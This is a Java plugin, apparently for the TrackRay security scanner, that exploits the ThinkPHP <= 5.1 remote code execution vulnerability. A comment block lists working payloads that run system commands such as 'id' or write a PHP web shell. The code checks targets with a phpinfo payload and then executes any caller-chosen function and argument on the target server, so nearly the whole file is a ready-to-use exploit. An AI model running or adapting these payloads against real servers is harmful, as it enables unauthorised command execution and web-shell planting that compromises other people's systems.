package com.trackray.module.plugin.webapp.thinkphp;

import com.trackray.base.annotation.Plugin;
import com.trackray.base.annotation.Param;
import com.trackray.base.annotation.Rule;
import com.trackray.base.httpclient.*;
import com.trackray.base.plugin.AbstractPlugin;
import com.trackray.base.plugin.CommonPlugin;
import com.trackray.base.utils.PageUtils;
import org.apache.commons.lang.StringUtils;
import org.apache.http.HttpException;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

@Plugin(title = "Thinkphp <= 5.1 远程代码执行漏洞" ,link = "https://www.t00ls.net/thread-48931-1-1.html", author = "浅蓝")
@Rule(params = {
                @Param(key = "target", desc = "目标地址"),
                @Param(key = "func",defaultValue = "phpinfo" , desc = "执行函数"),
                @Param(key = "var",defaultValue = "1" , desc = "函数参数"),
                },type = AbstractPlugin.Type.HTML )
public class Thinkphp5RCE extends CommonPlugin<String>{
    /** 5.1
     * s=index/\think\Request/input&filter=phpinfo&data=1

     * s=index/\think\Request/input&filter=system&data=id

     * s=index/\think\template\driver\file/write&cacheFile=shell.php&content=%3C?php%20phpinfo();?%3E

     * s=index/\think\view\driver\Php/display&content=%3C?php%20phpinfo();?%3E

     * s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1

     * s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
     * */

    private static String payload = "/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1";
    private String target;
    private List<String> r = new ArrayList<>();
    @Override
    public boolean check(Map<String, Object> param) {
        target = param.get("target").toString();
        crawlerPage.getRequest().setUrl(target.concat(payload));
        fetcher.run(crawlerPage);
        String text = crawlerPage.getResponse().getStatus().getContentString();
        if (StringUtils.contains(text,"PHP Version"))
        {
            r.add("存在漏洞"+target.concat(payload));
            return true;
        }
        return false;
    }

    @Override
    public String start() {
        if (param.containsKey("method") && param.containsKey("param")){
            String exp ="/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]="+param.get("method")+"&vars[1][]="+param.get("param");
            crawlerPage.getRequest().setUrl(target.concat(exp));
            fetcher.run(crawlerPage);
            r.add(PageUtils.getContent(crawlerPage));
        }

        return r.toString();
    }

    @Override
    public void after(Object... args) {
        if (result!=null){
            System.out.print("[+]");
            System.out.println(target);
        }
    }

}
